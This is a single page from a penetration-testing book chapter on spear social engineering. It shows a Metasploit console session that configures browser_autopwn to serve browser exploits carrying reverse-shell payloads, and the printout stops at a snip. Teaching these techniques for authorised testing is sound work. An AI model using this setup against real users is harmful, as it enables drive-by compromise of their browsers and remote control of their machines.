<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pfda" class="pf w2 h2" data-page-no="da"><div class="pc pcda w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 6: Spear Social Engineering<span class="_ _9"> </span><span class="ff1 fs9 lsa">195</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">Bro<span class="_ _0"/>wser_autopwn works by attempting to exploit a series of vulnerabilities in </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">rapid “machine-gun” succession. In the follo<span class="_ _0"/>wing example, we’<span class="_ _2"/>ve started Metasploit </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">console and loaded the auxiliary/server/bro<span class="_ _0"/>wser_autopwn module:</div><div class="t m0 x3 h40 yfc5 fff fs5 fc0 sc0 ls0 ws0">msf &gt; use auxiliary/server/browser_autopwn </div><div class="t m0 x3 h40 yfc6 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; show options</div><div class="t m0 x3 h40 y14b4 fff fs5 fc0 sc0 ls0 ws0">Module options (auxiliary/server/browser_autopwn):</div><div class="t m0 x3 h40 y14b5 fff fs5 fc0 sc0 ls0 ws0">   Name        Current Setting  Required  Description</div><div class="t m0 x3 h40 y14b6 fff fs5 fc0 sc0 ls0 ws0">   ----        ---------------  --------  -----------</div><div class="t m0 x3 h40 y14b7 fff fs5 fc0 sc0 ls0 ws0">   LHOST                        yes       The IP address to use for reverse-</div><div class="t m0 x3 h40 y14b8 fff fs5 fc0 sc0 ls0 ws0">connect payloads</div><div class="t m0 x3 h40 y14b9 fff fs5 fc0 sc0 ls0 ws0">   SRVHOST     0.0.0.0          yes       The local host to listen on. This </div><div class="t m0 x3 h40 y14ba fff fs5 fc0 sc0 ls0 ws0">must be an address on the local machine or 0.0.0.0</div><div class="t m0 x3 h40 y14bb fff fs5 fc0 sc0 ls0 ws0">   SRVPORT     8080             yes       The local port to listen on.</div><div class="t m0 x3 h40 y14bc fff fs5 fc0 sc0 ls0 ws0">   SSL         false            no        Negotiate SSL for incoming </div><div class="t m0 x3 h40 y14bd fff fs5 fc0 sc0 ls0 ws0">connections</div><div class="t m0 x3 h40 y14be fff fs5 fc0 sc0 ls0 ws0">   SSLCert                      no        Path to a custom SSL certificate </div><div class="t m0 x3 h40 y14bf fff fs5 fc0 sc0 ls0 ws0">(default is randomly generated)</div><div class="t m0 x3 h40 y14c0 fff fs5 fc0 sc0 ls0 ws0">   SSLVersion  SSL3             no        Specify the version of SSL that </div><div class="t m0 x3 h40 y14c1 fff fs5 fc0 sc0 ls0 ws0">should be used (accepted: SSL2, SSL3, TLS1)</div><div class="t m0 x3 h40 y14c2 fff fs5 fc0 sc0 ls0 ws0">   URIPATH                      no        The URI to use for this exploit </div><div class="t m0 x3 h40 y14c3 fff fs5 fc0 sc0 ls0 ws0">(default is random)</div><div class="t m0 x3 h40 y14c4 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; </div><div class="t m0 x3 h40 y14c5 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; set SRVPORT 80</div><div class="t m0 x3 h40 y14c6 fff fs5 fc0 sc0 ls0 ws0">SRVPORT =&gt; 80</div><div class="t m0 x3 h40 y14c7 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; set URIPATH /</div><div class="t m0 x3 h40 y14c8 fff fs5 fc0 sc0 ls0 ws0">URIPATH =&gt; /</div><div class="t m0 x3 h40 y14c9 fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; </div><div class="t m0 x3 h40 y14ca fff fs5 fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; [*] Obfuscating initial javascript 2014-02-20 </div><div class="t m0 x3 h40 y14cb fff fs5 fc0 sc0 ls0 ws0">19:30:20 -0500</div><div class="t m0 x3 h40 y14cc fff fs5 fc0 sc0 ls0 ws0">[*] Done in 1.200867792 seconds</div><div class="t m0 x3 h40 y14cd fff fs5 fc0 sc0 ls0 ws0">[*] Starting exploit modules on host 192.168.1.25...</div><div class="t m0 x3 h40 y14ce fff fs5 fc0 sc0 ls0 ws0">[*] ---</div><div class="t m0 x3 h40 y14cf fff fs5 fc0 sc0 ls0 ws0">[*] Starting exploit multi/browser/firefox_escape_retval with payload generic/</div><div class="t m0 x3 h40 y14d0 fff fs5 fc0 sc0 ls0 ws0">shell_reverse_tcp</div><div class="t m0 x3 h40 y14d1 fff fs5 fc0 sc0 ls0 ws0">[*] Using URL: http://0.0.0.0:80/kVNjKBtfkYYSE</div><div class="t m0 x3 h40 y14d2 fff fs5 fc0 sc0 ls0 ws0">[*]  Local IP: http://192.168.1.25:80/kVNjKBtfkYYSE</div><div class="t m0 x3 h40 y14d3 fff fs5 fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x3 h40 y14d4 fff fs5 fc0 sc0 ls0 ws0">[*] Starting exploit multi/browser/itms_overflow with payload generic/shell_</div><div class="t m0 x3 h40 y14d5 fff fs5 fc0 sc0 ls0 ws0">reverse_tcp</div><div class="t m0 x3 h40 y14d6 fff fs5 fc0 sc0 ls0 ws0">[*] Using URL: http://0.0.0.0:80/qQpMuTyq</div><div class="t m0 x3 h40 y14d7 fff fs5 fc0 sc0 ls0 ws0">[*]  Local IP: http://192.168.1.25:80/qQpMuTyq</div><div class="t m0 x3 h40 y14d8 fff fs5 fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x3 h40 y14d9 fff fs5 fc0 sc0 ls0 ws0">--- SNIP ---</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>